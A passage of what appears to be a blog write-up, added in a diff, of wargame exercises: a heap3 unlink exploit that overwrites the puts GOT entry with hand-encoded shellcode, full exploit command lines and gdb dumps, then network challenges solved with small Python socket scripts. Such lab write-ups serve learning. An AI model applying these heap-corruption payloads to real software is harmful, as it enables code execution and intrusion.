+       The size member contains the size of the current chunk, allocated in multiples of 8 bytes. This means that the 3 lowest bits of the size member will always be 0, and are therefore used as flag values:
+       - A (0x04): Allocated Arena - if this bit is 0, the chunk comes from the main arena and the main heap. If this bit is 1, the chunk comes from mmap’d memory and the location of the heap can be computed from the chunk’s address.
+       - M (0x02): MMap’d chunk - this chunk was allocated with a single call to mmap and is not part of a heap at all.
+       - P (0x01): Previous chunk is in use - if set, the previous chunk is still being used by the application, and thus the prev_size field is invalid. This bit really means that the previous chunk should not be considered a candidate for coalescing.
+       The fd and bk members are pointers to the next and previous chunks respectively and are only set when the chunk itself is freed and consequently added to a doubly linked free list that is used to track which chunks are currently free.</p>
+</blockquote>
+
+<blockquote>
+  <p>ulink() technique: upon calling free, the previous and following chunks are tested to see if they are in use (looking at the prev_size member). Adjacent free chunks will be consolidated together as a single chunk.
+Actual ulink operations are:</p>
+  <ul>
+    <li>writing the value of P-&gt;bk to the memory address pointed to by (P-&gt;fd) + 12, which corresponds to the bk member of P-&gt;fd.</li>
+    <li>writing the value of P-&gt;fd to the memory address pointed to by (P-&gt;bk) + 8, which corresponds to the fd member of P-&gt;bk.
+This means that controlling the values of P-&gt;bk and P-&gt;fk allows to write arbitrary data to an arbitrary location in memory.</li>
+  </ul>
+</blockquote>
+
+<ol>
+  <li>We know that a, b, and c will be allocated on the heap. Let’s start gdb, but a breakpoint after the three allocation have been done and the input copied there, and take a look. To get the address, we can run info proc map and gdb will tell us where the heap starts. That’s where we want to look.
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">(</span>gdb<span class="o">)</span> x/50x 0x804c000
+     0x804c000:  0x00000000  0x00000029  0x41414141  0x00000000
+     0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+     0x804c030:  0x42424242  0x00000000  0x00000000  0x00000000
+     0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c050:  0x00000000  0x00000029  0x43434343  0x00000000
+     0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
+     0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c0c0:  0x00000000  0x00000000
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>For each variable, we see that the size member is 0x00000029. This correponds to 00101001 in binary, meaning that the size is 40 bytes and that the previous chunk is in use. We now let gdb run until the three chunks of memory are freed, and then we take a look at the heap again:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">(</span>gdb<span class="o">)</span> x/50x 0x804c000
+     0x804c000:  0x00000000  0x00000029  0x0804c028  0x00000000
+     0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c020:  0x00000000  0x00000000  0x00000000  0x00000029
+     0x804c030:  0x0804c050  0x00000000  0x00000000  0x00000000
+     0x804c040:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
+     0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c070:  0x00000000  0x00000000  0x00000000  0x00000f89
+     0x804c080:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c090:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c0a0:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c0b0:  0x00000000  0x00000000  0x00000000  0x00000000
+     0x804c0c0:  0x00000000  0x00000000
+</code></pre></div>    </div>
+  </li>
+  <li>We know that the memory is free, so we would expect all prev_size, size, fd and bk to be set properly. However, only fd actually is (also size is set, but does not signal the previous chunk as free): the reason is that these chunks are so small (less than 64 bytes) that they are not merged together upon freeing, but kept separated for the sake of speed. We can change this behaviour by controlling the size field and making it large enough to move the chunks from the so-called fastbin to the normal bin.</li>
+  <li>However, there is a problem when trying to write the size and prev_size fields: to set them properly we need to use NULL bytes, but passing them as program arguments won’t work because they will be read as string terminators and whatever else is after that will not be read at all.</li>
+  <li>The solution is a trick involving an integer overflow (as in this Phrack paper): passing the value 0xFFFFFFFC (-4 as a signed integer), malloc will cast it to unsigned int, meaning that -4 becomes bigger than 64. The least significant bit of 0xFFFFFFFC is not set, meaning that the previous chunk is free and the unlinking procedure will be called on it. However, the address of this previous chunk will be calculated by subtracting -4 (therefore actually adding 4) from the current chunk’s beginning (resulting in the allocator thinking that the previous chunk actually starts at 4 bytes past the start of the current chunk), and its size will also be -4.</li>
+  <li>We target the second argument of heap3, so that we can exploit fd and bk when it is freed. The first argument is ‘AAAA’ and the last ‘DDDD’, to be easily recognizable. The middle argument is filled with As until the allocated memory is full; then the heap smashing bytes and a recognizable pattern as data.
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./heap3 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'AAAA ' + 'A' * 32 + '</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff' + '</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff' + 'AAAABBBBCCCC' + ' DDD'"</span><span class="sb">`</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Running this results in a segmentation fault as the system tries to move stuff around in adresses that do not actually exist. If we disassemble main, we see that after freeing all the allocated memory there is one last call to puts. We want to redirect this call so that instead it executes winner.</li>
+  <li>To get the address of winner we take a look at <code class="language-plaintext highlighter-rouge">objdump -t</code>, and see that it is located at 0x08048864. This is the address that we want to put instead of the puts entry in the GOT table, which is located at 0x0804b128 (obtained with objdump -R). The actual address that we want to overwrite is 0x0804b11c, because due to the fd-bk arithmetic we have to subtract 12 bytes from the memory address that we want to write to.</li>
+  <li>We can’t just pass the winner address in the heap, because trying to write to it will cause a segmentation fault. Instead, we need to encode a call to it and a return. This can be done for example with an online assembler: <code class="language-plaintext highlighter-rouge">push 0x08048864 ; ret</code></li>
+  <li>The encoded instructions correspond to \x68\x64\x88\x04\x08\xc3, which also nicely fits into the 8 bytes that are available. The resulting code is:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./heap3 <span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'AAAA</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">c3' + ' ' + 'A' * 32 + '</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff' + '</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff' + 'AAAA' + '</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">08' + ' ' + 'DDD'"</span><span class="sb">`</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>I have to admit that although the techniques used are mostly clear to me, I am still a bit confused about how all of it comes together. This code works, but breaking down the single parts and pointing where they will end up in memory is quite tricky.</p>
+
+<h3 id="net-00">[Net 00]</h3>
+<p>Converting strings to little endian integers</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define NAME "net0"
+#define UID 999
+#define GID 999
+#define PORT 2999
+</span>
+<span class="kt">void</span> <span class="nf">run</span><span class="p">(){</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">wanted</span><span class="p">;</span>
+
+    <span class="n">wanted</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Please send '%d' as a little endian 32bit int</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">wanted</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">i</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">":(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="n">wanted</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Thank you sir/madam</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"I'm sorry, you sent %d instead</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
+
+    <span class="cm">/* Run the process as a daemon */</span>
+    <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
+    
+    <span class="cm">/* Wait for socket activity and return */</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
+
+    <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
+    <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="cm">/* Don't do this :&gt; */</span>
+    <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+
+    <span class="n">run</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>What this program does is waiting for connections on port 2999, sending out a random number to whoever connects and expecting it sent back in little endian format. After launching net0, we can test it with <code class="language-plaintext highlighter-rouge">nc 127.0.0.1 2999.</code></li>
+  <li>
+    <p>To solve the challenge, we can implement a simple python program that connects to the deamon, reads the sent number and sends it back in little endian fashion:</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">socket</span>
+ <span class="kn">import</span> <span class="n">re</span>
+ <span class="kn">import</span> <span class="n">struct</span>
+
+ <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">2999</span><span class="p">))</span>
+
+ <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+ <span class="n">num</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nf">split</span><span class="p">()[</span><span class="mi">2</span><span class="p">][</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+ <span class="n">num</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+
+ <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">i</span><span class="sh">"</span><span class="p">,</span> <span class="n">num</span><span class="p">))</span>
+ <span class="k">print</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div>    </div>
+  </li>
+  <li>The data that we receive always has the same structure, so if we split it (creating a list containing the elements that were separated by spaces), we know that the number will always be the 3rd element of the list. Also, from that element we want to leave out the first and last character, that are the ticks. What is left can be easily converted to integer.</li>
+  <li>From the it’s just a matter to use the “i” option when packing the data to be sent back.</li>
+</ol>
+
+<h3 id="net-01">[Net 01]</h3>
+<p>Converting binary integers into ascii representation</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define NAME "net1"
+#define UID 998
+#define GID 998
+#define PORT 2998
+</span>
+<span class="kt">void</span> <span class="nf">run</span><span class="p">(){</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="n">fub</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
+
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">wanted</span><span class="p">;</span>
+
+    <span class="n">wanted</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>
+
+    <span class="n">sprintf</span><span class="p">(</span><span class="n">fub</span><span class="p">,</span> <span class="s">"%d"</span><span class="p">,</span> <span class="n">wanted</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wanted</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">wanted</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">wanted</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">":(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">":(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">'\r'</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">'\n'</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">fub</span><span class="p">,</span> <span class="n">buf</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"you correctly sent the data</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"you didn't send the data properly</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
+
+    <span class="cm">/* Run the process as a daemon */</span>
+    <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
+    
+    <span class="cm">/* Wait for socket activity and return */</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
+
+    <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
+    <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="cm">/* Don't do this :&gt; */</span>
+    <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+
+    <span class="n">run</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>What this program does is waiting for connections on port 2998, sending out a random number in little endian format, and expecting it sent back in ASCII format. After launching net1, we can test it with <code class="language-plaintext highlighter-rouge">nc 127.0.0.1 2998</code>.</li>
+  <li>Also in this case we create a small python script that connects to the deamon, reads the data, manipulates it and sends it back.
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">socket</span>
+ <span class="kn">import</span> <span class="n">re</span>
+ <span class="kn">import</span> <span class="n">struct</span>
+
+ <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">2998</span><span class="p">))</span>
+
+ <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+ <span class="n">num</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">I</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+ <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+ <span class="k">print</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div>    </div>
+  </li>
+  <li>The script unpacks the data reading it as an integer number, and then we just send it back as string.</li>
+</ol>
+
+<h3 id="net-02">[Net 02]</h3>
+<p>Adding 4 unsigned 32-bit integers (Keep in mind that it wraps)</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define NAME "net2"
+#define UID 997
+#define GID 997
+#define PORT 2997
+</span>
+<span class="kt">void</span> <span class="nf">run</span><span class="p">(){</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">quad</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">result</span><span class="p">,</span> <span class="n">wanted</span><span class="p">;</span>
+
+    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">random</span><span class="p">();</span>
+        <span class="n">result</span> <span class="o">+=</span> <span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="p">(</span><span class="n">quad</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="p">{</span>
+            <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">":(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wanted</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">result</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">":&lt;</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+
+    <span class="k">if</span><span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="n">wanted</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"you added them correctly</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"sorry, try again. invalid</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
+
+    <span class="cm">/* Run the process as a daemon */</span>
+    <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
+    
+    <span class="cm">/* Wait for socket activity and return */</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
+
+    <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
+    <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="cm">/* Don't do this :&gt; */</span>
+    <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+
+    <span class="n">run</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<ol>
+  <li>What this program does is waiting for connections on port 2997, sending 4 numbers that should be treated as unsigned integers, and expecting back the sum of those numbers. After launching net2, we can test it with <code class="language-plaintext highlighter-rouge">nc 127.0.0.1 2997</code>.</li>
+  <li>Again we create a python script that connects to the deamon, reads the data, manipulates it and sends it back.
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">socket</span>
+ <span class="kn">import</span> <span class="n">re</span>
+ <span class="kn">import</span> <span class="n">struct</span>
+
+ <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">2997</span><span class="p">))</span>
+
+ <span class="n">tot</span> <span class="o">=</span> <span class="mi">0</span>
+ <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nf">xrange</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+     <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+     <span class="n">tot</span> <span class="o">+=</span> <span class="nf">int</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">I</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+
+ <span class="n">tot</span> <span class="o">=</span> <span class="n">tot</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
+
+ <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">I</span><span class="sh">"</span><span class="p">,</span> <span class="n">tot</span><span class="p">))</span>
+ <span class="k">print</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+ <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div>    </div>
+  </li>
+  <li>The script reads 4 times 4 bytes, corresponding to the length of usnigned int. We add the numbers to each other, and before sending the sum back we perform the ‘&amp; 0xFFFFFFFF’ to make clear of the possible overflows.</li>
+</ol>
+
+<h3 id="net-03">[Net 03]</h3>
+<p>Implement a simple network protocol</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define NAME "net3"
+#define UID 996
+#define GID 996
+#define PORT 2996
+</span>
+<span class="cm">/*
+    * Extract a null terminated string from the buffer 
+    */</span>
+
+<span class="kt">int</span> <span class="nf">get_string</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">result</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="n">u_int16_t</span> <span class="n">len</span><span class="p">){</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte</span><span class="p">;</span>
+
+    <span class="n">byte</span> <span class="o">=</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">byte</span> <span class="o">&gt;</span> <span class="n">len</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"badly formed packet"</span><span class="p">);</span>
+    <span class="o">*</span><span class="n">result</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">byte</span><span class="p">);</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="o">*</span><span class="n">result</span><span class="p">,</span> <span class="n">buffer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">byte</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/*
+    * Check to see if we can log into the host
+    */</span>
+
+<span class="kt">int</span> <span class="nf">login</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="n">u_int16_t</span> <span class="n">len</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">resource</span><span class="p">,</span> <span class="o">*</span><span class="n">username</span><span class="p">,</span> <span class="o">*</span><span class="n">password</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">deduct</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">success</span><span class="p">;</span>
+
